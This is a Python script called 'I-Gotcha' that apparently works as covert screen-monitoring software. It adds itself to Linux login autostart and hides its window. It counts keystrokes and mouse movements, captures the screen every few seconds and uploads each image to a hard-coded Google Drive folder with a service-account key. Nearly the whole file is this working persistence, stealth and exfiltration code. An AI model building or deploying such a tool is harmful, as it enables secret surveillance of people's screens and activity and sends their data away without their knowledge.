import os
import sys
import platform
import pyautogui
from pynput import mouse, keyboard
from PyQt5.QtWidgets import QApplication, QWidget
from PyQt5 import QtCore, QtWidgets
import threading
import datetime
import time
import socket
from oauth2client.service_account import ServiceAccountCredentials
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import gi
gi.require_version('Gtk', '3.0')
gi.require_version('Gio', '2.0')
from gi.repository import Gtk, Gdk, Gio
import subprocess


def add_to_startup(program_path, program_name):
    desktop_file_path = os.path.expanduser("~/.config/autostart/{}.desktop".format(program_name))

    try:
        with open(desktop_file_path, "w") as desktop_file:
            desktop_file.write("""[Desktop Entry]
Type=Application
Exec={}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]={}
Name={}
Comment[en_US]=Autostart program
Comment=Autostart program\n""".format(program_path, program_name, program_name))

        return True

    except Exception:
        return False






def hide_application_window():
    window = Gtk.Window()
    window.set_skip_taskbar_hint(True)
    window.set_skip_pager_hint(True)
    window.set_type_hint(Gdk.WindowTypeHint.DOCK)
    window.set_decorated(False)
    window.set_opacity(0)
    window.show_all()
    window.hide()



class ScreenshotApp:
    def __init__(self):
        self.drive = self.authenticate_google_drive()
        self.device_name = socket.gethostname()
        self.mouse_count = 0
        self.keyboard_count = 0

    def authenticate_google_drive(self):
        credentials = ServiceAccountCredentials.from_json_keyfile_name("service_account_key.json",
                                                                       ['https://www.googleapis.com/auth/drive'])
        gauth = GoogleAuth()
        gauth.credentials = credentials
        drive = GoogleDrive(gauth)
        return drive

    def create_folder(self, parent_id, folder_name):
        folder_metadata = {
            'title': folder_name,
            'parents': [{'id': parent_id}],
            'mimeType': 'application/vnd.google-apps.folder'
        }
        folder = self.drive.CreateFile(folder_metadata)
        folder.Upload()
        return folder['id']

    def get_folder_id(self, parent_id, folder_name):
        query = f"'{parent_id}' in parents and title='{folder_name}' and mimeType='application/vnd.google-apps.folder' and trashed=false"
        folders = self.drive.ListFile({'q': query}).GetList()
        if folders:
            return folders[0]['id']
        else:
            return None

    def get_or_create_folder(self, parent_id, folder_name):
        folder_id = self.get_folder_id(parent_id, folder_name)
        if folder_id:
            return folder_id
        else:
            return self.create_folder(parent_id, folder_name)

    def start_screenshot_loop(self):
        # Get the folder ID where screenshots will be saved
        root_folder_id = "149FzfefJgMt5m0rILbdGccoermlHDpuT"
        # Initialize mouse and keyboard listeners
        mouse_listener = mouse.Listener(on_move=self.on_mouse_move)
        keyboard_listener = keyboard.Listener(on_press=self.on_keyboard_press)

        # Start the listeners
        mouse_listener.start()
        keyboard_listener.start()

        while True:
            try:
                print("Screenshot loop started")
                # Get the current date
                current_date = datetime.date.today().strftime("%d-%b")

                # Get or create the device folder
                device_folder_id = self.get_or_create_folder(root_folder_id, self.device_name)

                # Get or create the folder for the current date within the device folder
                date_folder_id = self.get_or_create_folder(device_folder_id, current_date)

                # Capture screenshot
                screenshot = pyautogui.screenshot()
                timestamp = datetime.datetime.now().strftime("%d-%b_%H-%M")
                filename = f"MC_{self.mouse_count}_KC_{self.keyboard_count}_{timestamp}.png"

                # Save screenshot locally
                local_path = os.path.join(self.device_name, current_date, filename)
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                screenshot.save(local_path)

                # Upload screenshot to Google Drive
                self.upload_file(local_path, filename, date_folder_id)
                print("Uploaded to Google Drive")

                print(f"Screenshot saved and uploaded: {filename}")
                time.sleep(3)  # 5 minutes

                # Reset mouse and keyboard counts
                self.mouse_count = 0
                self.keyboard_count = 0

            except Exception as e:
                print(f"Error: {e}")

    def upload_file(self, file_path, filename, folder_id):
        file_metadata = {
            'title': filename,
            'parents': [{'id': folder_id}]
        }
        file = self.drive.CreateFile(file_metadata)
        file.SetContentFile(file_path)
        file.Upload()
        print(f"Screenshot uploaded to Google Drive")

    def on_mouse_move(self, x, y):
        self.mouse_count += 1

    def on_keyboard_press(self, key):
        self.keyboard_count += 1



if __name__ == "__main__":

    print("This code runs only when script.py is executed directly.")

    program_path = "/home/bdpl/Binary_Data/dist/I-Gotcha/I-Gotcha"
    program_name = "I-Gotcha"

    if add_to_startup(program_path, program_name):
        print("Successfully added to startup.")
    else:
        print("Failed to add to startup.")

    hide_application_window()

    # Instantiate ScreenshotApp
    screenshot_app = ScreenshotApp()
    screenshot_app.start_screenshot_loop()




